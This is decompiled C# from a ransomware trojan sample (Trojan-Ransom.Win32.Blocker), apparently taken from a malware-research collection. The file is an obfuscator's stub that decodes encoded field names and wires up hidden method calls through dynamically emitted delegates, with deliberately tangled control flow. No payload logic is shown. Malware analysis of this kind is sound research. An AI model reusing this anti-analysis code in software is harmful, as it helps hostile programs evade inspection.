// Decompiled with JetBrains decompiler
// Type: .
// Assembly: 1m, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9A9758D8-D673-4760-AFDD-69A3D20C59FF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.krdt-d2cd288694c5883ae6364f17a60ae3fe9619748d94946bbd3e1ff8ba566b1e0f.exe

using \u0005;
using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace \u0004
{
  [\u0007.\u0007]
  [\u0003]
  internal static class \u0005
  {
    private static ModuleHandle \u0001;
    private static char[] \u0001 = new char[58]
    {
      '\u0001',
      '\u0002',
      '\u0003',
      '\u0004',
      '\u0005',
      '\u0006',
      '\a',
      '\b',
      '\u000E',
      '\u000F',
      '\u0010',
      '\u0011',
      '\u0012',
      '\u0013',
      '\u0014',
      '\u0015',
      '\u0016',
      '\u0017',
      '\u0018',
      '\u0019',
      '\u001A',
      '\u001B',
      '\u001C',
      '\u001D',
      '\u001E',
      '\u001F',
      '\u007F',
      '\u0080',
      '\u0081',
      '\u0082',
      '\u0083',
      '\u0084',
      '\u0086',
      '\u0087',
      '\u0088',
      '\u0089',
      '\u008A',
      '\u008B',
      '\u008C',
      '\u008D',
      '\u008E',
      '\u008F',
      '\u0090',
      '\u0091',
      '\u0092',
      '\u0093',
      '\u0094',
      '\u0095',
      '\u0096',
      '\u0097',
      '\u0098',
      '\u0099',
      '\u009A',
      '\u009B',
      '\u009C',
      '\u009D',
      '\u009E',
      '\u009F'
    };

    [\u0007.\u0007]
    [\u0003]
    public static void \u0001([In] int obj0)
    {
      Type typeFromHandle;
      try
      {
        typeFromHandle = Type.GetTypeFromHandle(\u0004.\u0005.\u0001.ResolveTypeHandle(33554433 + obj0));
      }
      catch
      {
        return;
      }
      if (true)
        goto label_49;
label_41:
      bool flag;
      MethodInfo methodFromHandle;
      ILGenerator ilGenerator;
      ilGenerator.Emit(flag ? OpCodes.Callvirt : OpCodes.Call, methodFromHandle);
      ilGenerator.Emit(OpCodes.Ret);
      Delegate @delegate;
      DynamicMethod dynamicMethod;
      try
      {
        @delegate = dynamicMethod.CreateDelegate(typeFromHandle);
      }
      catch
      {
        goto label_46;
      }
label_44:
      FieldInfo fieldInfo;
      try
      {
        fieldInfo.SetValue((object) null, (object) @delegate);
      }
      catch
      {
      }
label_46:
      int index1;
      ++index1;
label_47:
      FieldInfo[] fields;
      if (index1 >= fields.Length)
        return;
      fieldInfo = fields[index1];
      string name = fieldInfo.Name;
      flag = false;
      int num1 = 0;
      int index2 = name.Length - 1;
      while (true)
      {
        char ch;
        int index3;
        if (index2 >= 0)
        {
          ch = name[index2];
          if (ch == '~')
          {
            flag = true;
            goto label_18;
          }
          else
          {
            index3 = 0;
            goto label_14;
          }
        }
        else
          goto label_18;
label_11:
        num1 = num1 * 58 + index3;
        goto label_16;
label_14:
        int num2 = index3;
        int num3 = 58;
label_15:
        int num4;
        for (; num2 < num3; num2 = num4)
        {
          num4 = (int) \u0004.\u0005.\u0001[index3];
          int num5 = (int) ch;
          if (true)
          {
            if (num4 != num5)
            {
              if (true)
              {
                ++index3;
                goto label_14;
              }
              else
                goto label_23;
            }
            else
              goto label_11;
          }
          else
            num3 = num5;
        }
label_16:
        --index2;
        continue;
label_18:
        try
        {
          methodFromHandle = (MethodInfo) MethodBase.GetMethodFromHandle(\u0004.\u0005.\u0001.ResolveMethodHandle(num1 + 167772161));
        }
        catch
        {
          goto label_46;
        }
        if (methodFromHandle.IsStatic)
          break;
label_23:
        ParameterInfo[] parameters = methodFromHandle.GetParameters();
        int length1 = parameters.Length;
        int num6 = 1;
        if (num6 == 0)
        {
          num3 = num6;
          num2 = length1;
          goto label_15;
        }
        else
        {
          int length2 = length1 + num6;
          Type[] parameterTypes = new Type[length2];
          parameterTypes[0] = typeof (object);
          int index4 = 1;
          while (true)
          {
            if (index4 < length2)
            {
              parameterTypes[index4] = parameters[index4 - 1].ParameterType;
              ++index4;
            }
            else
            {
              dynamicMethod = new DynamicMethod(string.Empty, methodFromHandle.ReturnType, parameterTypes, typeFromHandle, true);
              ilGenerator = dynamicMethod.GetILGenerator();
              ilGenerator.Emit(OpCodes.Ldarg_0);
              if (length2 > 1)
              {
                if (true)
                  ilGenerator.Emit(OpCodes.Ldarg_1);
                else
                  break;
              }
              int num7 = length2;
label_32:
              if (num7 > 2)
                ilGenerator.Emit(OpCodes.Ldarg_2);
              if (length2 > 3)
                ilGenerator.Emit(OpCodes.Ldarg_3);
              if (length2 > 4)
              {
                int num8;
                for (int index5 = 4; index5 < length2; index5 = num8 + 1)
                {
                  ilGenerator.Emit(OpCodes.Ldarg_S, index5);
                  num8 = index5;
                  if (false)
                  {
                    num7 = num8;
                    goto label_32;
                  }
                }
                goto label_41;
              }
              else
                goto label_41;
            }
          }
          goto label_11;
        }
      }
      try
      {
        @delegate = Delegate.CreateDelegate(fieldInfo.FieldType, methodFromHandle);
        goto label_44;
      }
      catch (Exception ex)
      {
        goto label_46;
      }
label_49:
      fields = typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField);
      if (true)
      {
        index1 = 0;
        goto label_47;
      }
      else
        goto label_47;
    }

    static \u0005()
    {
      do
      {
        Type type;
        if (true)
          type = typeof (MulticastDelegate);
        if ((object) type != null)
          goto label_6;
label_5:
        continue;
label_6:
        \u0004.\u0005.\u0001 = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
        goto label_5;
      }
      while (false);
    }
  }
}
